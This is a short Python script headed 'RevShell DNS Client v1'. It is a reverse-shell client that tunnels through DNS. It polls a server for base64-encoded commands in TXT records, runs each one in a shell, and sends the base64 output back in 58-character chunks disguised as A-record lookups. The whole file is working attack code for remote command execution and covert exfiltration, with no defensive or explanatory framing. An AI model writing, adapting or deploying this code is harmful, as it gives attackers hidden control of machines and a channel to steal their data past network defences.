#!/usr/bin/env python
#RevShell DNS Client v1

import os
import subprocess, socket
import dns.resolver
import textwrap, base64
 
##Where to sent to
HOST = '127.0.0.1'
PORT = 53
#Default connection string, b64 encoded
nextCommand = base64.b64encode("nxt")
#print out

while 1:

  ##Query fake dns server for commands to run
  request = dns.message.make_query(nextCommand+'.com', dns.rdatatype.TXT)
  answers = dns.query.udp(request, HOST)
  #print answers ##for whole response, gets commands to run
  a = answers.to_text()
  answer = 0
  for line in a.split("\n"):
    if answer == 1:
      txt = textwrap.dedent(line.split('TXT')[-1]).strip('"')
      #print reply
      answer = 0
    if ";ANSWER" in line: answer = 1
    
  #Parse from command from response
  nxtCmd = base64.b64decode(txt)
  
  #Check for quit command
  if nxtCmd == "quit": break
  
  #Execute command
  proc = subprocess.Popen(nxtCmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  stdoutput = proc.stdout.read() + proc.stderr.read()
  
  #encode output data, ready for loop
  output = base64.b64encode(stdoutput)
  #Remove "=", add "-" to denote we need "="
  if output[-1] == "=": 
    if output[-2] == "=":
      output = output[0]+"-"+output[1]+"-"+output[2:-2]
    else:
      output = output[0]+"-"+output[1:-1]
  
  send =''
  output_end = len(output)
  for chunk in output:
    send += chunk
    output_end -= 1
    #Send every 58 charcters
    if len(send) == 58:
      feedback_request = dns.message.make_query(send+'.com', dns.rdatatype.A)
      dns.query.udp(feedback_request, HOST)
      send =''
    #Send out final chunk
    if output_end == 0:
      feedback_request = dns.message.make_query(send+'.com', dns.rdatatype.A)
      dns.query.udp(feedback_request, HOST)

exit()
